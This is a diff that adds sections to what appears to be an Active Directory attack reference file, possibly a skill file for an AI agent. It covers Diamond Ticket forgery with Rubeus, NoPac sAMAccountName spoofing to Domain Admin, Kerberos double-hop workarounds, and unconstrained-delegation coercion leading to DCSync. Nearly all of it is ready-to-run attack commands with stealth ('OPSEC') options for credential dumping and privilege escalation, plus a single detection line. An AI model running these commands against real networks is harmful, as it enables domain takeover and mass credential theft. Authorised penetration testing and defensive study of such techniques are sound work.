@@ -151,6 +151,112 @@ impacket-psexec -k -no-pass domain.local/user@<target>
 
 ---
 
+## Diamond Ticket
+
+Modifies a legitimate TGT instead of forging one from scratch. More stealthy than Golden Ticket because the ticket has a real creation timestamp, valid PA-DATA, and matches Kerberos policy values.
+
+**Requirements**: `krbtgt` AES256 key + any valid domain credential.
+
+```bash
+# Basic Diamond Ticket — request legitimate TGT, decrypt, modify PAC, re-encrypt
+.\Rubeus.exe diamond /krbkey:<aes256_krbtgt> /user:<low_priv_user> /password:<pass> /enctype:aes \
+  /domain:domain.local /dc:<dc_fqdn> /ticketuser:Administrator /ticketuserid:500 /nowrap
+
+# With /tgtdeleg — avoid sending credentials, uses Kerberos delegation to get TGT
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
+  /krbkey:<aes256_krbtgt> /nowrap
+
+# OPSEC-enhanced (2024+) — /ldap pulls real PAC data, /opsec matches Windows AS-REQ flow
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
+  /krbkey:<aes256_krbtgt> /ldap /opsec /nowrap
+
+# Diamond Ticket with ExtraSID (child-to-parent trust escalation)
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512 \
+  /sids:<parent_EA_SID>-519 /krbkey:<child_krbtgt_aes256> /nowrap
+
+# Service-ticket recutting (stealthier Silver Ticket)
+.\Rubeus.exe diamond /ticket:<base64_tgt> /service:cifs/<target_host> \
+  /servicekey:<aes256_service_key> /ticketuser:Administrator /ticketuserid:500 \
+  /ldap /opsec /nowrap
+```
+
+**Golden vs Diamond**:
+| Aspect | Golden Ticket | Diamond Ticket |
+|--------|--------------|----------------|
+| TGT origin | Forged from scratch | Modified legitimate TGT |
+| Timestamp | Arbitrary (detectable) | Real DC-issued timestamp |
+| PA-DATA | Missing/fake | Real pre-auth data |
+| Policy values | Must guess | Pulled from SYSVOL/LDAP |
+| Detection | Easier (anomalous lifetime, missing fields) | Harder (looks legitimate) |
+| Requirement | krbtgt NTLM/AES | krbtgt AES + valid user creds |
+
+---
+
+## NoPac / sAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)
+
+Escalates from any domain user to Domain Admin by exploiting how KDC resolves machine account names.
+
+**Mechanism**:
+1. Create a machine account (default: any user can create up to 10)
+2. Rename machine account's sAMAccountName to match DC name (without trailing `$`)
+3. Request TGT for the spoofed name
+4. Rename machine account back to original
+5. Request TGS using the TGT — KDC can't find the account, appends `$`, finds DC account → grants DC-level access
+
+```bash
+# Automated exploitation (noPac.py)
+python3 noPac.py domain.local/user:pass -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump
+python3 noPac.py domain.local/user:pass -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -shell
+
+# Manual steps (impacket)
+# 1. Create machine account
+impacket-addcomputer domain.local/user:pass -computer-name 'ATTACKER$' -computer-pass 'Passw0rd!'
+
+# 2. Clear SPNs and rename to DC
+python3 renameMachine.py domain.local/user:pass -current-name 'ATTACKER$' -new-name '<dc_hostname>'
+
+# 3. Request TGT for spoofed name
+impacket-getTGT domain.local/'<dc_hostname>':'Passw0rd!' -dc-ip <dc_ip>
+
+# 4. Rename back
+python3 renameMachine.py domain.local/user:pass -current-name '<dc_hostname>' -new-name 'ATTACKER$'
+
+# 5. Use S4U2self to get service ticket as administrator
+export KRB5CCNAME='<dc_hostname>.ccache'
+impacket-getST -spn 'cifs/<dc_fqdn>' -impersonate administrator domain.local/'<dc_hostname>' -k -no-pass
+export KRB5CCNAME=administrator.ccache
+impacket-secretsdump -k -no-pass domain.local/administrator@<dc_fqdn>
+
+# Check if patched (MachineAccountQuota > 0 required)
+crackmapexec ldap <dc_ip> -u user -p pass -M maq
+```
+
+**Detection**: Event ID 4741 (computer account created) + 4742 (account modified) in quick succession.
+
+---
+
+## Kerberos Double-Hop Problem — Workarounds
+
+When using WinRM/PSRemoting, Kerberos tickets are not forwarded to the second hop (e.g., querying LDAP from a remote session). Workarounds:
+
+```powershell
+# Workaround 1: PSCredential object (explicit credentials)
+$cred = New-Object PSCredential('DOMAIN\user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
+Get-DomainUser -SPN -Credential $cred
+
+# Workaround 2: Register PSSession configuration with RunAs
+Register-PSSessionConfiguration -Name 'AdminSession' -RunAsCredential DOMAIN\user
+Restart-Service WinRM
+Enter-PSSession -ComputerName <host> -Credential DOMAIN\user -ConfigurationName AdminSession
+# Now klist shows valid TGT — second hop works
+
+# Workaround 3: CredSSP delegation (less common, requires GPO)
+Enable-WSManCredSSP -Role Client -DelegateComputer <target>
+Enter-PSSession -ComputerName <target> -Authentication CredSSP -Credential $cred
+```
+
+---
+
 ## Golden and Silver Ticket
 
 See `active-directory-technique` SKILL.md §Phase 6.
@@ -160,3 +266,32 @@ Key material:
 - **Silver**: service account NTLM hash + domain SID → forge TGS for that service
 
 Golden ticket persists even after password reset (krbtgt needs two resets to invalidate).
+
+---
+
+## Unconstrained Delegation — Coercion-Based Exploitation
+
+Detailed coercion workflow for unconstrained delegation abuse:
+
+```bash
+# 1. Identify unconstrained delegation hosts (excluding DCs)
+Get-DomainComputer -Unconstrained | Where-Object {$_.distinguishedname -notmatch "Domain Controllers"} | Select dnshostname
+
+# 2. Set up Rubeus monitor on compromised unconstrained host
+.\Rubeus.exe monitor /interval:5 /nowrap /targetuser:<dc_hostname>$
+
+# 3. Coerce DC to authenticate to the unconstrained host
+python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <unconstrained_host_ip>
+# OR: python3 SpoolSample.py <dc_fqdn> <unconstrained_host_fqdn>
+# OR: python3 PetitPotam.py <unconstrained_host_ip> <dc_ip>
+
+# 4. Rubeus captures DC TGT — export and use for DCSync
+.\Rubeus.exe ptt /ticket:<captured_dc_tgt_base64>
+.\mimikatz.exe "lsadump::dcsync /domain:domain.local /all" "exit"
+
+# Alternative: extract on Linux
+echo "<base64_ticket>" | base64 -d > dc_tgt.kirbi
+impacket-ticketConverter dc_tgt.kirbi dc_tgt.ccache
+export KRB5CCNAME=dc_tgt.ccache
+impacket-secretsdump -k -no-pass domain.local/<dc_hostname>$@<dc_fqdn>
+```
